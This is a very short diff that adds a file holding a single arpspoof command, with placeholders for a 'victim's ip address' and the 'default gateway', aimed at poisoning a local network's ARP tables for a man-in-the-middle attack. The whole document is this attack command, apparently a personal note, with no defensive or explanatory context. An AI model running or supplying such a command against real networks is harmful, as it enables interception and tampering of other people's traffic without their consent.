@@ -1,0 +1,2 @@
+arpspoof -i wlo1 -t victim's ip address -r default gateway of your system
+
